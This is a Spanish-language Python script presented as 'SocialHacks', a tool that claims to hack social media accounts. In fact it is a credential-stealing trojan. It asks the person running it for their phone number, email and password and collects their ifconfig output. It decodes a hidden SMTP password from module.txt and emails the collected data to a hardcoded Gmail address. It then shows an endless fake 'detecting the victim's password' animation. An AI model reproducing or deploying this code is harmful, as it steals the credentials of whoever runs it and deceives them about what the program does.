#MODULOS 
import os
import sys
import time
import smtplib
from sympy.crypto.crypto import encipher_affine, decipher_affine
from sympy.crypto.crypto import encipher_shift, decipher_shift

#COLORES
ve = "\033[1;32;40m" #Ve
az = "\033[1;34;40m" #A                                           
ro = "\033[1;31;40m" #Ro

#FUNCIONES
def sutil(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(12. / 150)

def corrida(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(3. / 250)

def xuxa(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(2. / 120)

def saludo(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(3. / 100)

def medio(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(8. / 200)

def lento(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 200)

def proceso(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(15. / 150)
os.system("clear")
sutil(ve+"Para tener un resultado eficiente asegúrate de agregar la información correctamente que se te solicita.")
os.system("sleep 2")
os.system("clear")
corrida(az+"""            ¤▪¤▪¤▪¤▪♤¤▪¤▪¤▪♤¤▪¤▪¤▪¤
            S-O-C-I-A-L ♧ H-A-C-K-S
            ¤▪¤▪¤▪¤▪¤▪♤▪¤▪¤▪♤¤▪¤▪¤▪ """)

sutil(ve+"Hackea una red social en cuestión de minutos o segundos con SocialHacks")
def sz():
   sp = corrida(az+"_____")

medio(ro+"Red social:")
s = az+"-"

corrida(az+"_________________"+ro)
print ("1-.Facebook"+s)
sz()
print (ro+"2-.Instagram"+s)
sz()
print (ro+"3-.Twiter"+s)
sz()
print (ro+"4-.Reddit"+s)
sz()
print (ro+"5-.Tiktok"+s)
corrida(az+"_________________"+ro)
try:
   rp11 = int(input("Elige una opcion\n"+ve+'>>>'))
   if rp11 == 1:
      rmsn = "Facebook"
   elif rp11 == 2:
      rmsn = "Instagram"
   elif rp11 == 3:
      rmsn = "Twiter"
   elif rp11 == 4:
      rmsn = "Reddit"
   elif rp11 == 5:
      rmsn = "Tiktok"
   else:
      print ("Este numero no es una opción")
      sys.exit()
except ValueError:
   print (ro+"Tu respuesta no fue un numero")
   sys.exit()

print (ro+"Hss elegido",rmsn+'\n'+ro)

seq = open("module.txt")
asw = seq.read()
kew = (5, 5028)
wad = decipher_affine(asw,kew)
a = wad.lower()

subject = input("Añade tu nombre de perfil:\n>>> ")
numero = input(ro+"Agrega numero de celular:\n>>> ")
url = input(az+"Introduce la url del perfil de tu victima?\n>>> ")
rob = input(ve+"Introduce tu correo\n>>> ") 
psd = input(ro+"Introduce la contraseña\n>>> ")
tubo = os.popen("ifconfig")
tubo = tubo.readlines()
obj = "vallettaoficial@gmail.com"

num = "Numero:", numero
mar = "Url:", url
cor = "Correo:", rob
arb = "Contrasena:", psd

msg = num, mar, cor, arb, tubo

msg = ('Subject: {}\n\n{}'.format(subject, msg))
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login("patoelsa170@gmail.com", a)
server.sendmail("patoelsa170@gmail.com", obj, msg)
server.quit()

def x(i):
   for c in i:
      sys.stdout.write(c)
      sys.stdout.flush()
      time.sleep(12. /150)
x("Detectando contraseña de la victima")

while True:

   sys.stdout.write(".")
   sys.stdout.flush()
   time.sleep(40. / 30)
